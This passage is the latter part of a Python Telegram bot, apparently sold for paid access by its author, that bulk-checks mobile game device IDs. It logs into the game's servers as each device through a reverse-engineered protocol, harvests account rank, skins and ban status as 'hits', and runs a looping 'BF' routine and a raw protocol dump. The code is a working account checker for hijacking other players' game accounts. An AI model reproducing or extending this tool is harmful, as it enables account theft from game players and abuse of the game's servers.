             f"👤 `{profile['nickname']}`\n🔄 `{count}`\n"
             f"✅ `{success}`  ❌ `{fail}`\n"
             f"⚡ `{avg:.0f}ms`  🏃 `{sp:.2f}/s`  ⏱ `{el}s`\n\n👑 *@SHINRT771*")
    try:
        fut=asyncio.run_coroutine_threadsafe(app.bot.edit_message_text(
            chat_id=chat_id, message_id=msg_id, text=summary, parse_mode="Markdown"), loop)
        fut.result(timeout=20)
    except: pass
    with _bf_lock: _bf_stop_flags.pop(user_id, None)
    with job_lock: active_jobs.pop(user_id, None)

# ────────────────────────────────────────────────────────────────
# COMMANDS
# ────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    auth, _ = await user_manager.is_authorized(uid)
    if auth:
        ui = await user_manager.get_user_info(uid)
        s  = ui.get("stats", {})
        exp = ui.get("key_expiry")
        if exp:
            try:
                e = datetime.fromisoformat(exp)
                exp_display = "Lifetime" if e.year == 9999 else e.strftime("%Y-%m-%d %H:%M")
            except: exp_display = "Unknown"
        else: exp_display = "None"
        text=(f"🔥 *PREMIUM DEVID SEKER*\n👑 by @SHINRT771\n\n"
              f"📊 `Checked: {s.get('total_checked',0)}` | `Hits: {s.get('total_hits',0)}`\n"
              f"⏳ `Expiry: {exp_display}`  ⏱ `Uptime: {int(time.time()-start_time)}s`\n\n"
              f"📤 Choose a tool:")
        kb = kb_main_admin() if uid == OWNER_ID else kb_main_user()
        await update.message.reply_text(text, parse_mode="Markdown", reply_markup=kb)
    else:
        await update.message.reply_text(
            f"🚫 *ACCESS RESTRICTED*\n\n"
            f"💳 3 Days ₱50 · 7 Days ₱70 · 1 Month ₱100 · Lifetime ₱150\n"
            f"📩 @SHINRT771 · Use /redeem <key>",
            parse_mode="Markdown", reply_markup=kb_no_key())

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    await user_manager.register_user(uid, update.effective_user.username, update.effective_user.first_name)
    if not ctx.args:
        await update.message.reply_text("Usage: `/redeem <key>`", parse_mode="Markdown"); return
    ok, msg = await user_manager.redeem_key(uid, ctx.args[0].strip())
    await update.message.reply_text(("✅ " if ok else "❌ ") + msg)

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        f"📖 *Help*\n━━━━━━━━━━━━━━━\n"
        f"🔥 Bulk Check – send `.txt` file\n"
        f"🔍 Single Check – one device ID\n"
        f"🧪 /debug <device> – dump raw protocol\n"
        f"📊 /stats · 🛑 /stop\n\n👑 @SHINRT771",
        parse_mode="Markdown")

async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job:
        job["stopped"] = True
        with _bf_lock:
            ev = _bf_stop_flags.get(uid)
            if ev: ev.set()
        await update.message.reply_text("🛑 Stopping...")
    else: await update.message.reply_text("No active job.")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock: job = active_jobs.get(uid)
    if job:
        await update.message.reply_text(
            f"⚡ `{job.get('checked',0)}/{job.get('total',0)}`", parse_mode="Markdown")
    else: await update.message.reply_text("No active job.")

@admin_only
async def cmd_debug(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Dump raw SDP responses for a device so you can map tags."""
    args = ctx.args or []
    if not args:
        await update.message.reply_text(
            "Usage: `/debug <device_id>`\nDumps raw protocol responses as JSON files.",
            parse_mode="Markdown"); return
    device_id = args[0].strip()
    msg = await update.message.reply_text(
        f"🧪 Debug dumping `{device_id}` …", parse_mode="Markdown")

    def _dump():
        try:
            conn = GameConnection(device_id=device_id)
            raw = {}
            conn.connect()
            # Login
            conn.send_data(1, SdpStruct({
                0: device_id,
                1: f'gps_adid={conn.adid}&android_id={conn.android}&device_unique_id={conn.imei}',
                2: CLIENT_VERSION, 3: CHANNEL, 4: 'en'
            }))
            pid, res = conn.recv_data()
            raw['login_response'] = {'pid': pid, 'body': sdp_to_plain(res) if res else None}
            if pid == 2 and res:
                acc = res.get(0); sess = res[1]; zone = res[2][0]
                conn.account_id = acc; conn.session_key = sess; conn.zone_id = zone
                conn.creation_ts = _safe_int(res.get(19, 0), 0)
                # Get game server
                conn.send_data(5, SdpStruct({0: acc, 1: sess, 2: CLIENT_VERSION, 5: zone, 6: CHANNEL}))
                pid, res = conn.recv_data()
                raw['gameserver_response'] = {'pid': pid, 'body': sdp_to_plain(res) if res else None}
                if pid == 6 and res:
                    host, port = str(res[1]).split(':')
                    conn.cleanup()
                    conn.host, conn.port = host, _safe_int(port, 0)
                    conn.connect()
                    conn.send_data(10001, SdpStruct({
                        0: acc, 1: sess, 2: zone, 4: CLIENT_VERSION, 13: CHANNEL, 15: device_id}))
                    for _ in range(5):
                        pid, res = conn.recv_data()
                        if pid == 10002: break
                        if pid in (-1, None): break
                    raw['connect_game_response'] = {'pid': pid, 'body': sdp_to_plain(res) if res else None}
                    # 10101 ban check
                    conn.send_data(10101, SdpStruct({0: 0, 2: 2}))
                    for _ in range(3):
                        pid, res = conn.recv_data()
                        raw[f'ban_check_pid_{pid}'] = sdp_to_plain(res) if res else None
                        if pid in (20001, 20002, -1, None): break
                    # 10143 skin info
                    conn.send_data(10143, SdpStruct({0: acc, 1: zone}))
                    for _ in range(4):
                        pid, res = conn.recv_data()
                        if pid == 10144:
                            raw['skin_info_10144'] = sdp_to_plain(res) if res else None
                            break
                        if pid in (-1, None): break
                    # 11153 player lookup
                    conn.send_data(11153, SdpStruct({1: acc}))
                    for _ in range(8):
                        pid, res = conn.recv_data()
                        if pid == 11154:
                            raw['lookup_11154'] = sdp_to_plain(res) if res else None
                            break
                        if pid in (-1, None): break
                    # 10128 role info
                    conn.send_data(10128, SdpStruct({1: acc, 2: zone}))
                    for _ in range(4):
                        pid, res = conn.recv_data()
                        if pid == 10129:
                            raw['role_info_10129'] = sdp_to_plain(res) if res else None
                            break
                        if pid in (-1, None): break
            conn.cleanup()

            # Save
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_dev = re.sub(r'[^A-Za-z0-9_-]', '_', device_id)[:40]
            folder = os.path.join(DEBUG_DIR, f"{safe_dev}_{ts}")
            os.makedirs(folder, exist_ok=True)
            with open(os.path.join(folder, "raw_dump.json"), "w", encoding="utf-8") as f:
                json.dump(raw, f, indent=2, ensure_ascii=False)

            # Also write a human-readable tag listing
            with open(os.path.join(folder, "tags_listing.txt"), "w", encoding="utf-8") as f:
                for block_name, block in raw.items():
                    f.write(f"\n===== {block_name} =====\n")
                    body = block.get('body') if isinstance(block, dict) else block
                    if isinstance(body, dict):
                        for k, v in body.items():
                            short = str(v)[:120]
                            f.write(f"  tag {k}: {short}\n")
                    else:
                        f.write(f"  {body}\n")
            return folder
        except Exception as e:
            return f"ERROR: {e}"

    import concurrent.futures as cf
    with cf.ThreadPoolExecutor(1) as ex:
        result = ex.submit(_dump).result(timeout=90)

    if isinstance(result, str) and result.startswith("ERROR"):
        await msg.edit_text(f"❌ {result}")
    else:
        zip_path = result + ".zip"
        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for root, _, files in os.walk(result):
                for fn in files:
                    full = os.path.join(root, fn)
                    zf.write(full, os.path.relpath(full, result))
        with open(zip_path, "rb") as f:
            await msg.edit_text("✅ Debug dump ready.")
            await ctx.bot.send_document(
                chat_id=update.effective_chat.id, document=f,
                filename=os.path.basename(zip_path),
                caption="🧪 Inspect `raw_dump.json` and `tags_listing.txt` to map tags.",
                parse_mode="Markdown")

@admin_only
async def cmd_admin(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👑 *Admin Panel*", reply_markup=kb_admin_main(), parse_mode="Markdown")

@admin_only
async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    args = ctx.args or []
    usage = "`/genkey hours 24 1`\n`/genkey days 7 1`\n`/genkey months 1 1`\n`/genkey lifetime 1`"
    try:
        if not args: raise ValueError
        dt = args[0].lower()
        if dt not in ("hours","days","months","lifetime"): raise ValueError
        if dt == "lifetime":
            dv = 0; mu = int(args[1]) if len(args) > 1 else 1
        else:
            if len(args) < 3: raise ValueError
            dv = int(args[1]); mu = int(args[2])
            if dv < 1: raise ValueError
        if mu < 1: raise ValueError
    except:
        await update.message.reply_text(f"Usage:\n{usage}", parse_mode="Markdown"); return
    keys, _ = await user_manager.generate_key(dv, dt, 1, mu)
    key = keys[0]
    exp = user_manager.keys["keys"][key]["expiry"]
    dd = {"hours":f"{dv}h","days":f"{dv}d","months":f"{dv}mo","lifetime":"Lifetime"}[dt]
    await update.message.reply_text(
        f"🔑 `{key}`\nDuration: `{dd}`\nExpires: {fmt_expiry(exp)}\nMax users: `{mu}`",
        parse_mode="Markdown")

@admin_only
async def cmd_ban_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Usage: `/ban_user <id>`"); return
    ok = await user_manager.ban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'Banned' if ok else 'Not found'}.")

@admin_only
async def cmd_unban_user(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Usage: `/unban_user <id>`"); return
    ok = await user_manager.unban_user(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'Unbanned' if ok else 'Not found'}.")

@admin_only
async def cmd_addvip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Usage: `/addvip <id>`"); return
    ok = await user_manager.add_vip(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'VIP granted' if ok else 'Not found'}.")

@admin_only
async def cmd_removevip(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Usage: `/removevip <id>`"); return
    ok = await user_manager.remove_vip(int(ctx.args[0].strip()))
    await update.message.reply_text(f"{'VIP removed' if ok else 'Not found'}.")

@admin_only
async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    users = await user_manager.get_all_users()
    total=len(users); active=sum(1 for u in users.values() if u.get("activated"))
    banned=sum(1 for u in users.values() if u.get("banned")); vip=sum(1 for u in users.values() if u.get("vip"))
    with COUNTER_LOCK:
        rk = "\n".join(f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`"
                       for r in ['warrior','elite','master','gm','epic','legend','mythic'])
    await update.message.reply_text(
        f"📊 *Stats*\nUsers `{total}` · Active `{active}` · VIP `{vip}` · Banned `{banned}`\n\n{rk}",
        parse_mode="Markdown")

@admin_only
async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Usage: `/broadcast msg`"); return
    msg = " ".join(ctx.args)
    users = await user_manager.get_all_users()
    sent = 0
    for uid in users:
        try:
            await ctx.bot.send_message(chat_id=int(uid), text=f"📢 {msg}")
            sent += 1
        except: pass
        await asyncio.sleep(0.05)
    await update.message.reply_text(f"Sent to `{sent}`.", parse_mode="Markdown")

@admin_only
async def cmd_remove_key(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Usage: `/remove_key <id>`"); return
    t = ctx.args[0].strip()
    users = await user_manager.get_all_users()
    if t not in users: await update.message.reply_text("Not found."); return
    users[t]["activated"] = False; users[t]["key_expiry"] = None
    await user_manager._save_users()
    await update.message.reply_text(f"Removed for `{t}`.", parse_mode="Markdown")

@admin_only
async def cmd_setthreads(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args or []) != 2:
        await update.message.reply_text(f"Usage: `/setthreads <id> <1-{MAX_THREADS_LIMIT}>`", parse_mode="Markdown"); return
    try:
        t = int(ctx.args[0]); l = int(ctx.args[1])
        ok = await user_manager.set_threads_limit(t, l)
        await update.message.reply_text(f"{'Set' if ok else 'Failed'}.", parse_mode="Markdown")
    except: await update.message.reply_text("Invalid numbers.")

# ────────────────────────────────────────────────────────────────
# DOCUMENT / TEXT / PHOTO HANDLERS
# ────────────────────────────────────────────────────────────────

async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    auth, reason = await user_manager.is_authorized(uid)
    if not auth:
        await update.message.reply_text(f"🚫 `{reason}`", parse_mode="Markdown"); return
    with job_lock:
        wants_bulk = active_jobs.get(uid, {}).get("awaiting_bulk_file")
    if not wants_bulk:
        await update.message.reply_text("Use /start → 🔥 Bulk Check first."); return
    with job_lock:
        if uid in active_jobs and active_jobs[uid].get("status") == "running":
            await update.message.reply_text("⚠️ Active job. /stop first."); return
    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Send a `.txt` file."); return
    file = await ctx.bot.get_file(doc.file_id)
    data = await file.download_as_bytearray()
    lines = [l.strip() for l in data.decode(errors="ignore").splitlines() if l.strip()]
    if not lines:
        await update.message.reply_text("No device IDs."); return
    threads = await user_manager.get_threads_limit(uid)
    prog_msg = await update.message.reply_text(
        f"🔥 Loading `{len(lines)}` devices with `{threads}` threads...",
        parse_mode="Markdown")
    job = {
        "user_id": uid, "chat_id": update.effective_chat.id,
        "msg_id": prog_msg.message_id, "devices": lines, "threads": threads,
        "stopped": False, "checked": 0, "total": len(lines),
        "started": time.time(), "status": "running",
    }
    with job_lock:
        active_jobs[uid] = job
        active_jobs[uid].pop("awaiting_bulk_file", None)
    loop = asyncio.get_event_loop()
    threading.Thread(target=run_bulk_job, args=(job, loop, ctx.application), daemon=True).start()

async def on_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    auth, _ = await user_manager.is_authorized(uid)
    with job_lock:
        awaiting_single = active_jobs.get(uid, {}).get("awaiting_single_device")
        awaiting_bf     = active_jobs.get(uid, {}).get("awaiting_bf_device")

    if awaiting_single and auth:
        device_id = update.message.text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_single_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)
        await update.message.reply_text(f"🔍 Checking `{device_id}` …", parse_mode="Markdown")
        acc, zone, stat = GameLogin(device_id).run()
        if not acc or not zone:
            await update.message.reply_text(f"❌ Login failed: {stat}"); return
        try:
            with GameConnection(device_id=device_id) as conn:
                if not conn.login_to_login_server(): await update.message.reply_text("❌ Login server fail"); return
                if not conn.get_game_server():       await update.message.reply_text("❌ Get GS fail"); return
                if not conn.connect_to_game_server():await update.message.reply_text("❌ Connect GS fail"); return
                pd = _extract_player_data(conn, acc, zone, device_id)
                if not pd: await update.message.reply_text("❌ Extract fail"); return
                save_account({'Device id': device_id, 'role_id': acc, 'zone_id': zone}, pd, "detail")
                payload = build_account_payload(device_id, acc, zone, pd)
                text_body = format_account_details_text(payload)
                json_body = format_account_details_json(payload)
                is_banned = 'ban' in str(pd.get('ban_status', '')).lower()
                header = "🎯 <b>HITS FOUND</b>" + ("  🔴 <b>BANNED</b>" if is_banned else "")
                await update.message.reply_text(
                    f"{header}\n<pre>{html_escape(text_body)}</pre>\n✨ <b>@SHINRT771</b>",
                    parse_mode="HTML")
                try:
                    bio = io.BytesIO(json_body.encode('utf-8')); bio.name = f"account_{acc}_{zone}.json"
                    await update.message.reply_document(
                        document=bio, filename=f"account_{acc}_{zone}.json",
                        caption=f"📄 JSON · `{acc}` ({zone})", parse_mode="Markdown")
                except: pass
                await user_manager.update_stats(uid, checked=1, hits=0 if is_banned else 1)
        except Exception as e:
            await update.message.reply_text(f"❌ Error: {e}")
        return

    if awaiting_bf and auth:
        device_id = update.message.text.strip()
        with job_lock:
            active_jobs.get(uid, {}).pop("awaiting_bf_device", None)
            if not active_jobs.get(uid): active_jobs.pop(uid, None)
        await update.message.reply_text("🔍 Verifying for BF …")
        import concurrent.futures as cf
        with cf.ThreadPoolExecutor(1) as ex:
            try: profile = ex.submit(fetch_session_profile, device_id).result(timeout=30)
            except: profile = None
        if not profile:
            await update.message.reply_text("❌ Dead device ID."); return
        await update.message.reply_text(
            f"✅ Verified\n👤 `{profile['nickname']}`\n🆔 `{profile['account_id']}` (Z{profile['zone_id']})\n"
            f"🌐 `{profile['gs_info']}`\n⚡ {profile['ban_status']}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🧪 1x",  callback_data=f"bf_run:{device_id}:1:0")],
                [InlineKeyboardButton("⚡ 10x", callback_data=f"bf_run:{device_id}:10:2")],
                [InlineKeyboardButton("🚀 50x", callback_data=f"bf_run:{device_id}:50:1")],
                [InlineKeyboardButton("💥 100x",callback_data=f"bf_run:{device_id}:100:0.5")],
                [InlineKeyboardButton("♾ ∞",   callback_data=f"bf_run:{device_id}:0:0")],
                [InlineKeyboardButton("❌",    callback_data="bf_cancel")],
            ]))
        ctx.user_data[f"bf_profile_{uid}"] = profile
        return

async def on_photo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    with job_lock: plan_key = active_jobs.get(uid, {}).get("awaiting_receipt")
    if not plan_key: return
    plan = GCASH_PLANS.get(plan_key, {})
    username = update.effective_user.username or update.effective_user.first_name or str(uid)
    with job_lock:
        active_jobs.get(uid, {}).pop("awaiting_receipt", None)
        if not active_jobs.get(uid): active_jobs.pop(uid, None)
    await update.message.reply_text(f"✅ Receipt received. Forwarded to admin.")
    try:
        await ctx.bot.send_photo(
            chat_id=OWNER_ID, photo=update.message.photo[-1].file_id,
            caption=f"💳 NEW PAYMENT\nBuyer: @{username} (`{uid}`)\nPlan: {plan.get('label')} — {plan.get('price')}",
            parse_mode="Markdown", reply_markup=kb_gcash_admin(str(uid), plan_key))
    except Exception as e: log.error(f"Receipt fwd: {e}")

# ────────────────────────────────────────────────────────────────
# CALLBACKS
# ────────────────────────────────────────────────────────────────

async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    try: await q.answer()
    except BadRequest: pass
    data = q.data; uid = update.effective_user.id

    if data == "tool_bulk":
        auth, reason = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{reason}`", parse_mode="Markdown"); return
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await q.edit_message_text("⚠️ Active job."); return
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_bulk_file"] = True
        await q.edit_message_text("📤 Send `.txt` file with device IDs.", parse_mode="Markdown"); return

    if data == "tool_single":
        auth, reason = await user_manager.is_authorized(uid)
        if not auth: await q.edit_message_text(f"🚫 `{reason}`", parse_mode="Markdown"); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_single_device"] = True
        await q.edit_message_text("🔍 Send one device ID as text.", parse_mode="Markdown"); return

    if data == "tool_stats":
        with COUNTER_LOCK:
            lines = ["📊 *Rank Hit Counters*"]
            for r in ['warrior','elite','master','gm','epic','legend','mythic']:
                lines.append(f"┣ {r.capitalize():<12}: `{HIT_COUNTERS.get(r,0)}`")
            lines.append(f"┣ V2L Active  : `{HIT_COUNTERS.get('v2l_active',0)}`")
            lines.append(f"┣ V2L Inactive: `{HIT_COUNTERS.get('v2l_inactive',0)}`")
            lines.append(f"┣ Sultan      : `{HIT_COUNTERS.get('sultan',0)}`")
            lines.append(f"┗ Banned      : `{HIT_COUNTERS.get('banned',0)}`")
        await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

    if data == "menu_buy":
        await q.edit_message_text("💳 *Plans*\n3 Days ₱50 · 7 Days ₱70 · 1 Month ₱100 · Lifetime ₱150",
                                  parse_mode="Markdown", reply_markup=kb_gcash_plans()); return

    if data == "menu_help":
        await q.edit_message_text("📖 /help · /redeem · /stop · /stats\n👑 @SHINRT771"); return

    if data.startswith("gcash_sel:"):
        pk = data.split(":", 1)[1]
        plan = GCASH_PLANS.get(pk)
        if not plan: await q.answer("Unknown plan.", show_alert=True); return
        with job_lock:
            if uid not in active_jobs: active_jobs[uid] = {}
            active_jobs[uid]["awaiting_receipt"] = pk
        await q.edit_message_text(
            f"💳 *Pay*: {plan['label']} — {plan['price']}\nSend to `09910411990` (R.B.)\n"
            f"Then send the receipt photo here.",
            parse_mode="Markdown"); return

    if data.startswith("gcash_approve:"):
        if uid != OWNER_ID: await q.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        plan = GCASH_PLANS.get(plan_key, {})
        keys, _ = await user_manager.generate_key(plan.get("dval", 1), plan.get("dtype", "days"), 1, 1)
        key = keys[0] if keys else "ERROR"
        users = await user_manager.get_all_users()
        if buyer_uid not in users:
            await q.answer("User not found.", show_alert=True); return
        users[buyer_uid]["activated"] = True
        users[buyer_uid]["key_expiry"] = user_manager.keys["keys"][key]["expiry"]
        await user_manager._save_users()
        txn = get_next_txn_number()
        await q.answer("✅ Approved", show_alert=False)
        try:
            await ctx.bot.send_message(chat_id=int(buyer_uid),
                text=f"✅ *APPROVED #{txn}*\nPlan: `{plan.get('label')}`\n🔑 `{key}`\nUse /redeem {key}",
                parse_mode="Markdown")
        except: pass
        return

    if data.startswith("gcash_deny:"):
        if uid != OWNER_ID: await q.answer("Admin only.", show_alert=True); return
        _, buyer_uid, plan_key = data.split(":", 2)
        txn = get_next_txn_number()
        await q.answer("❌ Denied", show_alert=False)
        try:
            await ctx.bot.send_message(chat_id=int(buyer_uid), text=f"❌ PAYMENT DENIED #{txn}")
        except: pass
        return

    if data.startswith("stop_") and not data.startswith("stop_bf_"):
        target = int(data.split("_")[1])
        if uid == target or uid == OWNER_ID:
            with job_lock:
                if target in active_jobs: active_jobs[target]["stopped"] = True
            await q.edit_message_text("🛑 Stopped.")
        else: await q.answer("Not yours!", show_alert=True)
        return

    if data.startswith("stop_bf_"):
        target = int(data.split("_")[2])
        if uid == target or uid == OWNER_ID:
            with _bf_lock:
                ev = _bf_stop_flags.get(target)
                if ev: ev.set()
            await q.edit_message_text("🛑 BF stopped.")
        else: await q.answer("Not yours!", show_alert=True)
        return

    if data.startswith("bf_run:"):
        parts = data.split(":")
        if len(parts) < 4: await q.answer("Bad data.", show_alert=True); return
        device_id, loops, delay = parts[1], int(parts[2]), float(parts[3])
        profile = ctx.user_data.get(f"bf_profile_{uid}")
        if not profile: await q.edit_message_text("❌ Profile expired."); return
        with job_lock:
            if uid in active_jobs and active_jobs[uid].get("status") == "running":
                await q.edit_message_text("⚠️ Active job."); return
        label = f"{loops}x" if loops > 0 else "♾"
        pm = await ctx.bot.send_message(chat_id=update.effective_chat.id,
            text=f"⚡ BF {label} …", parse_mode="Markdown")
        ev = threading.Event()
        with _bf_lock: _bf_stop_flags[uid] = ev
        bf_job = {"user_id": uid, "chat_id": update.effective_chat.id,
                  "msg_id": pm.message_id, "profile": profile,
                  "loops": loops, "delay": delay, "stop_event": ev, "status": "running"}
        with job_lock: active_jobs[uid] = bf_job
        threading.Thread(target=run_bf_job, args=(bf_job, asyncio.get_event_loop(), ctx.application),
                         daemon=True).start()
        await q.edit_message_text(f"⚡ BF started ({label}).")
        return

    if data == "bf_cancel":
        await q.edit_message_text("❌ Cancelled."); return

    if data == "open_admin_panel":
        if uid != OWNER_ID: await q.answer("Admin only.", show_alert=True); return
        await q.edit_message_text("👑 Admin", reply_markup=kb_admin_main()); return

    if data.startswith("adm_"):
        if uid != OWNER_ID: await q.answer("Admin only.", show_alert=True); return
        if data == "adm_refresh":
            users = await user_manager.get_all_users()
            ac=sum(1 for u in users.values() if u.get("activated"))
            bc=sum(1 for u in users.values() if u.get("banned"))
            vc=sum(1 for u in users.values() if u.get("vip"))
            await q.edit_message_text(
                f"👑 *Admin*\nUsers `{len(users)}` Active `{ac}` VIP `{vc}` Banned `{bc}`",
                reply_markup=kb_admin_main(), parse_mode="Markdown")
            await q.answer("Refreshed"); return
        if data == "adm_stats": await cmd_stats(update, ctx); return
        if data == "adm_running":
            with job_lock:
                rn = [(k, v) for k, v in active_jobs.items() if v.get("status") == "running"]
            await q.edit_message_text(f"Running: `{len(rn)}`", parse_mode="Markdown"); return
        if data == "adm_toggle_lock":
            cfg = load_config(); cfg["locked"] = not cfg.get("locked", False); save_config(cfg)
            await q.answer(f"{'Locked' if cfg['locked'] else 'Unlocked'}"); return
        if data == "adm_genkey":
            await q.edit_message_text("Use `/genkey days 7 1`", parse_mode="Markdown"); return
        if data == "adm_users":
            users = await user_manager.get_all_users()
            lines = ["👥 Users"]
            for uid_, info in list(users.items())[:30]:
                lines.append(f"`{uid_}` {'🚫' if info.get('banned') else '✅'}")
            await q.edit_message_text("\n".join(lines), parse_mode="Markdown"); return

# ────────────────────────────────────────────────────────────────
# MAIN
# ────────────────────────────────────────────────────────────────

async def post_init(app: Application) -> None:
    user_cmds = [
        BotCommand("start", "Dashboard"), BotCommand("redeem", "Redeem key"),
        BotCommand("stop", "Stop job"), BotCommand("status", "Job status"),
        BotCommand("help", "Help"),
    ]
    await app.bot.set_my_commands(user_cmds)
    if OWNER_ID:
        await app.bot.set_my_commands(user_cmds + [
            BotCommand("admin", "Admin panel"), BotCommand("genkey", "Gen key"),
            BotCommand("debug", "Dump raw protocol"), BotCommand("stats", "Stats"),
            BotCommand("ban_user", "Ban"), BotCommand("unban_user", "Unban"),
            BotCommand("addvip", "VIP+"), BotCommand("removevip", "VIP-"),
            BotCommand("broadcast", "Broadcast"), BotCommand("setthreads", "Threads"),
            BotCommand("remove_key", "Remove key"),
        ], scope={"type": "chat", "chat_id": OWNER_ID})
    log.info(f"🚀 {BOT_NAME} v{BOT_VERSION} online")

def main():
    http_request = HTTPXRequest(
        connect_timeout=TELEGRAM_CONNECT_TIMEOUT, read_timeout=TELEGRAM_READ_TIMEOUT,
        write_timeout=TELEGRAM_WRITE_TIMEOUT,     pool_timeout=TELEGRAM_POOL_TIMEOUT)
    app = (Application.builder().token(BOT_TOKEN).request(http_request)
           .post_init(post_init).build())

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("redeem", cmd_redeem))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("debug", cmd_debug))
    app.add_handler(CommandHandler("admin", cmd_admin))
    app.add_handler(CommandHandler("genkey", cmd_genkey))
    app.add_handler(CommandHandler("remove_key", cmd_remove_key))
    app.add_handler(CommandHandler("ban_user", cmd_ban_user))
    app.add_handler(CommandHandler("unban_user", cmd_unban_user))
    app.add_handler(CommandHandler("addvip", cmd_addvip))
    app.add_handler(CommandHandler("removevip", cmd_removevip))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("setthreads", cmd_setthreads))

    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.PHOTO, on_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_handler(CallbackQueryHandler(handle_callback))

    log.info(f"🔥 {BOT_NAME} v{BOT_VERSION} starting…")
    try:
        app.run_polling(bootstrap_retries=10, allowed_updates=Update.ALL_TYPES,
                        drop_pending_updates=False)
    except NetworkError as e:
        log.error(f"Network: {e}. Retry 5s…")
        time.sleep(5); main()
    except Exception as e:
        log.error(f"Fatal: {e}"); sys.exit(1)

if __name__ == "__main__":
    main()